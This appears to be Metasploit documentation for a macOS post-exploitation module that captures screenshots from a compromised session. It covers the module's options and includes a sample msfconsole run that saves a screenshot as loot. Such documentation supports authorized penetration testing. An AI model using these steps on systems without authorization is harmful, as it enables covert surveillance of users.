## Vulnerable Application

This module takes screenshots of target desktop and automatically downloads them.

## Verification Steps

  1. Start msfconsole
  2. Get a shell, user level is fine
  3. Do: ```use post/osx/capture/screen```
  5. Do: ```set session #```
  5. Do: ```run```
  6. You should have a screenshot saved to loot

## Options

  **COUNT**
  The number of screenshots to collect.  Default is `1`.

  **DELAY**
  Interval between screenshots in seconds. 0 for no delay.  Default is `10`.

  **EXE_PATH**
  Path to remote screencapture executable.  Default is `/usr/sbin/screencapture`

  **FILETYPE**
  File format to use when saving a snapshot (Accepted: png, gif).  Default is `png`.

  **TMP_PATH**
  Path to remote temp directory.  Default is `/tmp/<random>`

## Scenarios

### User level shell on OSX 10.14.4

```
msf5 post(osx/capture/keylog_recorder) > use post/osx/capture/screen 
msf5 post(osx/capture/screen) > set session 1
session => 1
msf5 post(osx/capture/screen) > run

[*] Capturing 1 screenshots with a delay of 10 seconds
[*] Screen Capturing Complete
[*] Use "loot -t screen_capture.screenshot" to see file locations of your newly acquired loot
[*] Post module execution completed
msf5 post(osx/capture/screen) > loot -t screen_capture.screenshot

Loot
====

host           service  type                       name              content     info        path
----           -------  ----                       ----              -------     ----        ----
222.222.2.222           screen_capture.screenshot  screenshot.0.png  image/png   Screenshot  /loot/20190414205923_default_222.222.2.222_screen_capture.s_194117.png
```
